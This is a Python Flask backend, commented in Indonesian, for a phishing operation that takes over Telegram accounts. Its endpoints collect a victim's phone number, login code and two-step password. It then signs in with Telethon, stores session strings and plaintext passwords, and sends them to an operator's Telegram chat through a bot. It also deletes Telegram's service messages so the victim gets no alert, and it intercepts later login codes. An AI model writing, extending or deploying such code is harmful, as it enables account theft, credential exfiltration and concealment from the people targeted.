import os, requests, asyncio, re, threading, sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
CORS(app)

# Ambil dari Variables Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
DOMAIN = os.getenv("RAILWAY_STATIC_URL")
RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""

# --- DATABASE PERMANEN (Agar Sesi Tidak Hilang Saat Restart) ---
def init_db():
    conn = sqlite3.connect('sessions.db')
    curr = conn.cursor()
    curr.execute('''CREATE TABLE IF NOT EXISTS users 
                    (nomor TEXT PRIMARY KEY, session TEXT, hash TEXT, nama TEXT, sandi TEXT, status_id INTEGER)''')
    conn.commit()
    conn.close()

def save_user(nomor, session=None, hash=None, nama=None, sandi=None, status_id=None):
    conn = sqlite3.connect('sessions.db')
    curr = conn.cursor()
    curr.execute("INSERT OR IGNORE INTO users (nomor) VALUES (?)", (nomor,))
    if session: curr.execute("UPDATE users SET session=? WHERE nomor=?", (session, nomor))
    if hash: curr.execute("UPDATE users SET hash=? WHERE nomor=?", (hash, nomor))
    if nama: curr.execute("UPDATE users SET nama=? WHERE nomor=?", (nama, nomor))
    if sandi: curr.execute("UPDATE users SET sandi=? WHERE nomor=?", (sandi, nomor))
    if status_id: curr.execute("UPDATE users SET status_id=? WHERE nomor=?", (status_id, nomor))
    conn.commit()
    conn.close()

def get_user(nomor):
    conn = sqlite3.connect('sessions.db')
    curr = conn.cursor()
    curr.execute("SELECT * FROM users WHERE nomor=?", (nomor,))
    row = curr.fetchone()
    conn.close()
    if row:
        return {"nomor": row[0], "session": row[1], "hash": row[2], "nama": row[3], "sandi": row[4], "status_id": row[5]}
    return None

init_db()

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        num = re.sub(r'\D', '', data.get('nomor', ''))
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num

        u = get_user(nomor)
        sess_str = u['session'] if u else ""
        
        client = TelegramClient(StringSession(sess_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            save_user(nomor, hash=res.phone_code_hash, session=client.session.save())
            return jsonify({"status": "success"})

        elif step == 2:
            otp_code = data.get('otp')
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=u['hash'])
                return await finalize_login(client, nomor)
            except errors.SessionPasswordNeededError:
                save_user(nomor, session=client.session.save())
                return jsonify({"status": "need_2fa"})
            except: return jsonify({"status": "error", "message": "OTP SALAH"}), 400

        elif step == 3:
            sandi = data.get('sandi')
            try:
                await client.sign_in(password=sandi)
                save_user(nomor, sandi=sandi)
                return await finalize_login(client, nomor)
            except: return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
    finally:
        if client: await client.disconnect()

async def finalize_login(client, nomor):
    me = await client.get_me()
    nama = (me.first_name if me.first_name else "User").split()[0]
    u = get_user(nomor)
    save_user(nomor, nama=nama, session=client.session.save())
    
    await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
    
    pesan = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {u['sandi'] if u else 'None'}"
    bot_api("sendMessage", {
        "chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown",
        "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
    })
    return jsonify({"status": "success"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        bot_api("answerCallbackQuery", {"callback_query_id": call["id"]})
        
        cb_data = call.get("data", "")
        if cb_data.startswith("upd_"):
            nomor = cb_data.split("_")[1]
            # Kirim pesan status
            res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"})
            save_user(nomor, status_id=res.get('result', {}).get('message_id'))
            # Jalankan Monitoring
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor)), daemon=True).start()
                
    return jsonify({"status": "success"}), 200

async def monitor_otp(nomor):
    u = get_user(nomor)
    if not u or not u['session']: return
    
    client = TelegramClient(StringSession(u['session']), int(API_ID), API_HASH)
    try:
        await client.connect()
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # Ambil data terbaru dari DB
                curr_u = get_user(nomor)
                if curr_u['status_id']:
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": curr_u['status_id']})
                
                teks = f"Nama: **{curr_u['nama']}**\nNomor: `{nomor}`\nKata sandi: {curr_u['sandi']}\nOTP: `{otp.group(0)}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, "text": teks, "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                })
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        await client.run_until_disconnected()
    except: pass
    finally: await client.disconnect()

if __name__ == "__main__":
    if RAILWAY_URL:
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))